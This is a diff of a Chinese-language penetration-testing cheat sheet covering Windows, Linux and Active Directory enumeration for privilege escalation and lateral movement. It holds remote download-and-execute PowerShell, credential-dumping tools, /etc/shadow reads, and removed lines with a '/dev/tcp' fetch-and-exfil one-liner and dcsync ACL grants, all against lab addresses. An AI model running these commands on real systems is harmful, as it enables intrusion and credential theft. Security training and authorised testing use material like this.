@@ -1,38 +1,8 @@
-# *枚举（windows枚举，域枚举，linux枚举；此阶段的目的是为了主机提权和内网横向收集信息。）
+# Enumeration
 
 [TOC]
 
-###### exp利用枚举
-
-<br>
-
-github.com/SecWiki/windows-kernel-exploits
-
-github.com/strozfriedberg/Windows-Exploit-Suggester
-
-<br>
-
-github.com/SecWiki/linux-kernel-exploits
-
-github.com/The-Z-Labs/linux-exploit-suggester
-
-github.com/jondonas/linux-exploit-suggester-2
-
-<br>
-
-searchsploit xxx
-
-metasploit search suggester
-
-www.exploit-db.com #exploit-db
-
-www.google.com #google
-
-www.seebug.org #Seebug
-
-github.com #github
-
-## windows枚举（服务器信息，网络信息，用户信息，防护软件，密码搜索）
+## windows枚举（服务器信息，网络信息，用户信息，防护软件，密码搜索）(cmd,powershell|peass,metasploit)
 
 #### 服务器信息枚举（版本，架构，服务，进程，驱动，磁盘，补丁，系统，应用程序，计划任务，开机启动，环境变量）
 
@@ -233,7 +203,7 @@ whoami /all #查看当前用户名，sid，组信息，权限
 
 whoami /user #查看当前用户sid
 
-wmic useraccount get name,sid 查看账户sid
+wmic useraccount get name,sid #查看账户sid
 
 whoami /priv #查看当前用户权限
 
@@ -289,9 +259,9 @@ netsh advfirewall firewall add rule name="Allow 8080 TCP" dir=in action=allow pr
 
 netsh advfirewall firewall add rule name="block 8080 TCP" dir=in action=block protocol=TCP localport=8080 #开通一条防火墙规则,名字为"block 8080 TCP",关闭8080端口,不允许外部访问本地8080端口，协议为tcp
 
-netsh advfirewall firewall show rule name="Allow 8080 TCP" 查看防火墙规则状态
+netsh advfirewall firewall show rule name="Allow 8080 TCP" #查看防火墙规则状态
 
-netsh advfirewall firewall delete rule name="mm" 删除名字为Allow 8080 TCP 的防火墙规则
+netsh advfirewall firewall delete rule name="mm" #删除名字为Allow 8080 TCP 的防火墙规则
 
 $f=new-object -comobject hnetcfg.fwpolicy2 ; $f.rules | ? { $_.action -eq "0" } | select name,applicationname,localports #列出所有防火墙阻止的端口
 ```
@@ -329,7 +299,7 @@ QQPCRTP.exe #QQ电脑管家
 
 avcenter.exe/avguard.exe/avgnt.exe/sched.exe #Avira(小红伞)
 
-SafeDogGuardCenter.exe 和其他带有 safedog字符的进程 #安全狗
+SafeDogGuardCenter.exe #安全狗和其他带有safedog字符的进程
 
 D_Safe_Manage.exe/d_manage.exe #D盾
 
@@ -435,7 +405,7 @@ sqlite3 database.db
 ###### 应用中的密码
 
 ```
-powershell -ep bypass "IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1');invoke-sessiongopher -thorough" #sessionGopher 应用中的密码
+powershell -ep bypass "IEX (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1');invoke-sessiongopher -thorough" #sessionGopher应用中的密码
 
 lazagne.exe all #lazagne github.com/AlessandroZ/LaZagne
 
@@ -481,204 +451,12 @@ wsl -u root cat /etc/shadow
 #### 自动枚举
 
 ```
-peass #github.com/peass-ng/PEASS-ng
+peass : winpeas -a
 
-post/windows/gather/enum_applications #应用程序
-
-post/windows/gather/enum_shares #共享
-
-post/windows/gather/enum_unattend #无人值守文件
+metasploit : search enum
 ```
 
-## 域枚举
-
-#### powerview(远程)
-
-#### 安装
-
-```
-python -m venv pwview
-
-source pwview/bin/activate
-
-cd pwview
-
-proxychains git clone https://github.com/aniqfakhrul/powerview.py.git #下载powerview项目
-
-cd powerview.py 
-
-proxychains ../bin/pip3 install "git+https://github.com/aniqfakhrul/powerview.py" #使用pwview/bin/pip3
-```
-
-#### 使用
-
-```
-powerview two/win2019:root@192.168.12.5 #连接
-
-powerview two/win2019:root@192.168.12.5 --relay [--relay-host] [--relay-port] [--use-ldap | --use-ldaps] #relay连接
-
-[TAB] #查看帮助
-
-wiki:
-
-github.com/aniqfakhrul/powerview.py
-
-
-
-Get-Domain #AD域信息查询
-
-
-
-Get-DomainOU [-Identity] #查询AD中所有的OU或特定OU
-
-Add-DomainOU
-
-Remove-DomainOU
-
-
-
-Get-DomainComputer #查看AD域内机器账户
-
-Add-DomainComputer/Add-ADComputer -ComputerName machine2 -ComputerPass 1qaz@WSX #添加AD域机器账户
-
-Remove-DomainComputer/Remove-ADComputer -ComputerName machine2 #移除AD域机器账户
-
-
-
-Get-DomainUser #查看AD域内所有账户或特定用户
-
-Get-LocalUser
-
-Add-DomainUser/Add-ADUser -UserName qq -UserPass 1qaz@WSX #添加AD域账户
-
-Remove-DomainUser/Remove-ADUser -Identity "qq" #移除AD域账户
-
-
-
-Get-DomainGroupMember [-Identity] #查看AD域组内用户
-
-Add-DomainGroupMember/Add-GroupMember -Identity "administrators" -Members "qq" #添加AD域用户到组
-
-Remove-DomainGroupMember/Remove-GroupMember -Identity "administrators" -Members "qq" #移除组中AD域用户
-
-
-
-Get-DomainGroup [-Identity "administrators"] #获得全部/某个组信息
-
-Get-DomainGroup -MemberIdentity "win2019" 查询用户所属组信息
-
-Add-DomainGroup -Identity "qq-group" #添加域组
-
-
-
-Get-DomainObject/Get-ADObject [-Identity] #查看AD域内域对象[-SearchBase "CN=Users,DC=two,DC=com"] 查询users容器中的对象
-
-Set-DomainObject/Set-ADObject #添加AD域内域对象
-
-Remove-DomainObject/Remove-ADObject #移除AD域内域对象
-
-
-
-Get-DomainObjectOwner/Get-ObjectOwner #查询指定AD对象所有者信息
-
-Set-DomainObjectOwner/Set-ObjectOwner #查询指定AD对象所有者信息
-
-
-
-Add-DomainObjectAcl/Add-ObjectAcl #添加指定AD对象的ACL
-
-Remove-DomainObjectAcl/Remove-ObjectAcl #移除指定AD对象的ACL
-
-
-
-Get-DomainObjectAcl/Get-ObjectAcl
-
-Get-DomainUser -Identity "win2019" #查询win2019对象的objectSid
-
-Get-DomainObjectAcl -SecurityIdentifier "S-1-5-21-873118422-227618334-1429070027-1000"#查看win2019账户的权限（如果什么都没有就是没有权限）
-
-Get-DomainObjectAcl -Identity "CN=win2019,CN=Users,DC=two,DC=com"#查看其他安全主体对win2019账户的权限
-
-\#SecurityIdentifier 对 ObjectDN 所拥有的权限（ActiveDirectoryRights,AccessMask,ObjectAceType）
-
-\#[-Select "SecurityIdentifier,ObjectDN,ActiveDirectoryRights,AccessMask,ObjectAceType" -TableView] 选择显示选项以及是否按照表格形式排列
-
-
-
-Add-DomainObjectAcl -TargetIdentity "DC=two,DC=com" -PrincipalIdentity "win2019" -Rights dcsync #添加win2019对tow.com All 权限的acl
-
-Remove-DomainObjectAcl -TargetIdentity "DC=two,DC=com" -PrincipalIdentity "win2019" -Rights dcsync #删除win2019对tow.com All 权限的acl
-```
-
-#### powerview
-
-```
-Get-NetDomain: 获取当前用户所在域的名称
-
-Get-NetUser: 获取所有用户的详细信息
-
-Get-NetDomainController: 获取所有域控制器的信息
-
-Get-NetComputer: 获取域内所有机器的详细信息
-
-Get-NetOU: 获取域中的OU信息
-
-Get-NetGroup: 获取所有域内组和组成员信息
-
-Get-NetFileServer: 根据SPN获取当前域使用的文件服务器信息
-
-Get-NetShare: 获取当前域内所有网络共享信息
-
-Get-NetSession: 获取指定服务器的会话
-
-Get-NetRDPSession: 获取指定服务器的远程连接
-
-Get-NetProcess: 获取远程主机的进程
-
-Get-UserEvent: 获取指定用户的日志
-
-Get-ADObiect: 获取活动目录的对象
-
-Get-NetGPO: 获取域内所有的组策略对象
-
-Get-DomainPolicy: 获取域默认策略或域控制器策略
-
-Invoke-UserHunter: 获取域用户登录的计算机信息及该用户是否有本地管理员权限
-
-Invoke-ProcessHunter: 通过查询域内所有的机器进程找到特定用户
-
-Invoke-UserEvenHunter: 根据用户日志查询某域用户登录过哪些域机器。
-```
-
-#### bloodyAD
-
-```
-bloodyAD -u administrator -p 1qaz@WSX -d two.com --dc-ip 192.168.12.5 --host 192.168.12.5 #连接
-
-bloodyAD -u administrator -p 1qaz@WSX -d two.com --dc-ip 192.168.12.5 --host 192.168.12.5 add genericAll "CN=win2019,CN=Users,DC=two,DC=com" "CN=kk,CN=Users,DC=two,DC=com" #添加genericAll权限，实现kk对win2019的fullcontrol
-```
-
-#### ldapsearch
-
-```
-ldapsearch -x -H ldap://192.168.12.5 -b "cn=users,dc=two,dc=com" "name=krbtgt" #匿名查询
-
-ldapsearch -x -H ldap://192.168.12.5 -D "win2019@two.com" -w "root" -b "cn=users,dc=two,dc=com" "name=krbtgt" #登录查询
-
-ldapsearch -H "ldap://192.168.12.5" -D "win2019@two.com" -w "root" -b "cn=users,dc=two,dc=com" "name=*" dn #查询users组下的成员，并返回每个成员的dn
-```
-
-#### nxc bloodhound
-
-```
-bloodhound-python -d one.com -u cook -p '1qaz@WSX' -dc DC.one.com -c all -ns 192.168.10.5 --zip
-
-proxychains bloodhound-python -d one.com -u cook -p '1qaz@WSX' -dc DC.one.com -c all  --dns-tcp -ns 192.168.10.5 --zip --dns-timeout 60 #跨代理访问
-
-nxc ldap one.com -u cook -p '1qaz@WSX' --bloodhound -c all --dns-server 192.168.10.5
-```
-
-## linux枚举（服务器信息，网络信息，用户信息，软件和文件）
+## linux枚举（服务器信息，网络信息，用户信息，软件和文件）(bash|peass,metasploit)
 
 #### 服务器信息枚举（虚拟化，系统基本信息，内核版本，系统架构，发行版本，系统主机名，系统环境，进程，corn自动任务，磁盘配置）
 
@@ -779,7 +557,7 @@ cat /etc/crontab
 ###### 磁盘配置
 
 ```
-cat /etc/fstab 查看挂载信息
+cat /etc/fstab #查看挂载信息
 
 fdisk -l #查看未挂载磁盘
 
@@ -836,9 +614,11 @@ netstat -l
 netstat -s
 
 netstat -ano
+```
 
 ###### dns
 
+```
 cat /etc/resolv.conf #查看dns配置文件
 ```
 
@@ -978,36 +758,120 @@ find / -name id_rsa -exec ls -liah {} \; 2>/dev/null #查看ssh私钥文件
 
 #### 自动枚举
 
-###### 目标不出网，文件不落地
-
 ```
-kali : nc -lvnp 81 | tee linpeas_result.txt
+peass : linpeas -a
 
-python3 -m http.server 80
-
-target : curl -L kali_link/linpeas.sh | sh | nc kali_link 81
-
-less -r linpeas.txt #格式化显示
+metasploit : search enum
 ```
 
-###### 目标无curl，无nc，不出网，文件不落地
+## 域枚举(powerview-python|bloodhound(bloodhound-python),nxc)
+
+#### 域内信息枚举(powerview-python)
+
+###### 安装&连接
 
 ```
-kali : nc -lvnp 443 < linpeas.sh
+python -m venv pwview
 
-kali : nc -lvnp 445
+source pwview/bin/activate
 
-target : cat < /dev/tcp/192.168.12.130/443 | sh > /dev/tcp/192.168.12.130/445
+cd pwview
+
+proxychains git clone https://github.com/aniqfakhrul/powerview.py.git #下载powerview项目
+
+cd powerview.py 
+
+proxychains ../bin/pip3 install "git+https://github.com/aniqfakhrul/powerview.py" #使用pwview/bin/pip3
 
 
 
-linenum
+source ./pwview/bin/activate
 
-linux-smart-enumeration
+powerview two/win2019:root@192.168.12.5 #连接
+```
 
-linux-exploit-suggester
+###### 域名，域控制器，域sid，域策略
 
-linuxprivchecker.py
+```
+Get-Domain #获取到域名，域控制器，域sid，域策略
 
-unix-privesc-check
+Get-DomainController #域控制器信息
+```
+
+###### 域用户，用户策略，用户属性
+
+```
+Get-DomainUser -Identity "win2019"
+```
+
+###### 域主机，主机策略，主机属性
+
+```
+Get-DomainComputer  -Identity "DC"
+```
+
+###### 域组
+
+```
+Get-DomainGroup -Identity "Administrators" #域组，组内成员
+```
+
+###### 域组内成员
+
+Get-DomainGroupMember -Identity "Administrators"
+
+###### 域GPO
+
+```
+Get-DomainGPO
+```
+
+###### 域OU
+
+```
+Get-DomainOU
+```
+
+###### 域信任
+
+```
+Get-DomainTrust
+```
+
+###### 域object
+
+```
+Get-DomainObject -Identity "win2019" #获取域对象
+```
+
+###### 域ACL
+
+```
+Get-DomainObjectAcl -Identity "CN=win2019,CN=Users,DC=two,DC=com" #查看其他安全主体对域对象win2019的权限
+
+Get-DomainObjectAcl -SecurityIdentifier "S-1-5-21-873118422-227618334-1429070027-1000" #获取域对象win2019对其他安全主体的权限
+
+[-Select "SecurityIdentifier,ObjectDN,ActiveDirectoryRights,AccessMask,ObjectAceType" -TableView]
+```
+
+###### 登录用户
+
+```
+Get-NetLoggedOn -Computer 192.168.12.5 #目标主机登录信息，当前登录用户
+```
+
+###### 主机共享
+
+```
+Get-NetShare -Computer 192.168.12.5 #目标主机共享
+```
+
+#### 自动枚举(bloodhound)
+
+```
+blood-python :bloodhound-python -d one.com -u cook -p '1qaz@WSX' -dc DC.one.com -c all -ns 192.168.10.5 --zip #bloodhound-python收集域信息
+
+bloodhound-python : proxychains bloodhound-python -d one.com -u cook -p '1qaz@WSX' -dc DC.one.com -c all  --dns-tcp -ns 192.168.10.5 --zip --dns-timeout 60 #跨代理访问
+
+nxc : nxc ldap one.com -u cook -p '1qaz@WSX' --bloodhound -c all --dns-server 192.168.10.5 #nxc收集域信息
 ```
